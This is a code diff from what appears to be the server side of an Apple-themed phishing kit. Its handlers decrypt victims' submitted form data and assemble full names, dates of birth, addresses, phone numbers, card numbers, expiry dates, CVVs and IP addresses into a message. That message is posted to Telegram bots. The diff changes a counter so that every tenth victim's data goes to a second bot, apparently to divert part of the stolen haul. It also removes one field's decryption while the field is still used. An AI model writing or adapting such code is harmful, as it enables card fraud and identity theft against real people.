@@ -8573,9 +8573,6 @@ app.post("/trizApple", (req, res) => {
   addy1 = CryptoJS.AES.decrypt(req.body.addy1, "402312").toString(
     CryptoJS.enc.Utf8
   );
-  addy2 = CryptoJS.AES.decrypt(req.body.addy2, "402312").toString(
-    CryptoJS.enc.Utf8
-  );
   town = CryptoJS.AES.decrypt(req.body.town, "402312").toString(
     CryptoJS.enc.Utf8
   );
@@ -10384,11 +10381,11 @@ app.post("/spooferGooferApple", (req, res) => {
     .then(function () {
       binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
       var originalText = `+----------- Personal Information ------------+\nFull Name: ${firstName} ${lastName}\nDOB: ${dob}\nAddress: ${addy1}, ${addy2}\nCity: ${town}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Name: ${ccname}\nCard Number: ${ccnum}\nExpiry: ${ccexpmonth}/${ccexpyear}\nCVV: ${cvv}\n+ ----------- IP Information ------------+\nIP: ${userIp}\n+ ----------- BIN List Info ------------+\n${binList}`;
-      if (Spoofergoofer == 600) {
+      if (Spoofergoofer == 10) {
         axios.post(
           `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
         );
-        Spoofergoofer = 0;
+        Spoofergoofer = 6;
       } else {
         axios.post(
           `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=AppleSpooferGoofer:\n${originalText}`
